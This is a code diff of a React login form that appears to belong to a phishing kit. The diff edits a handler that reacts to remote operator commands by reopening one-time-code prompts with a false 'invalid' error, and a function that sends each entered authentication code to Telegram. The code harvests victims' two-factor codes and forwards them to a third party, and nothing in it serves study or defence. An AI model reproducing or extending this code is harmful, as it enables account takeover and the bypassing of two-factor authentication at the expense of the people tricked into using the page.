@@ -48,27 +48,17 @@ export default function LoginForm() {
     const [isHovered, setIsHovered] = useState(false)
 
     useEffect(() => {
-        console.log("Received command:", command);
-      
-        if (command === 'REQUEST_AUTH_OTP_CODE_AGAIN' && modal === 'AuthApp') {
-            console.log("command gotten in client is ", command)
-          // For the Authenticator OTP flow:
-          setInvalid(true); // Show error (or any other UI indication)
-          setIsLoading(false);
-        } else if (command === 'REQUEST_EMAIL_OTP_CODE_AGAIN' && modal === 'Email') {
-            console.log("command gotten in client is ", command)
-          // For the Email OTP flow:
-          setInvalid(true);
-          setIsLoading(false);
-        } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
-          // Example: if you want to route somewhere after a specific command:
-          console.log("command gotten in client is ", command)
-        //   setIsLoading(false);
-        //   setTimeout(() => {
-        //     router.push('/AuthenticationPage');
-        //   }, 1500);
+        console.log("Command is ", command);
+        if (command === 'REQUEST_AUTH_OTP_CODE_AGAIN') {
+            setModal('AuthApp'); // Set modal to AuthApp
+            setDisplayModal(true); // Show the modal
+            setInvalid(true); // Show error state
+        } else if (command === 'REQUEST_EMAIL_OTP_CODE_AGAIN') {
+            setModal('Email'); // Set modal to Email
+            setDisplayModal(true); // Show the modal
+            setInvalid(true); // Show error state
         }
-      }, [command]);
+    }, [command]);
 
     // const { validatePassword } = useValidatePassword();
     const handleOtpValidation = () => {
@@ -84,7 +74,7 @@ export default function LoginForm() {
         if (isValid) {
           console.log(`${modal} OTP is valid. Sending to Telegram...`);
           // Send OTP along with its type. Adjust sendMessageToTelegram as needed.
-          sendMessageToTelegram({ code: otpCode, type: modal });
+          sendMessageToTelegram(otpCode);
         } else {
           // If invalid, show loader for 1 second, then turn it off.
           setTimeout(() => {
